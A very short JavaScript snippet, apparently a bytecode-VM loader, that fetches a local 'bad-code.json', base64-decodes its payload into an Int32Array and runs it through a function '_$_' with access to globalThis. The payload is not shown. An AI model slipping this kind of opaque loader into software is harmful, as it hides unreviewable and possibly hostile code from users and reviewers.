fetch('./bad-code.json')
.then(it => it.json())
.then(it => _$_(
        Reflect.construct(Int32Array, [Uint8Array.from(atob(it.p), c => c.charCodeAt(0)).buffer]),
        it.t,
        0,
        [globalThis, { _$_ }]
    )
)